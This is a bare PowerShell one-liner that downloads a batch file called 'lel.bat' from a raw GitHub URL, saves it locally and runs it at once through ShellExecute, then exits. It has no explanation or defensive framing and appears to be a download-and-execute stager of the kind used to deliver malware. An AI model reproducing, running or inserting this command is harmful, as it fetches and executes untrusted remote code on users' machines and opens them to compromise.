$down = New-Object System.Net.WebClient; $url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'; $file = 'lel.bat'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit; 
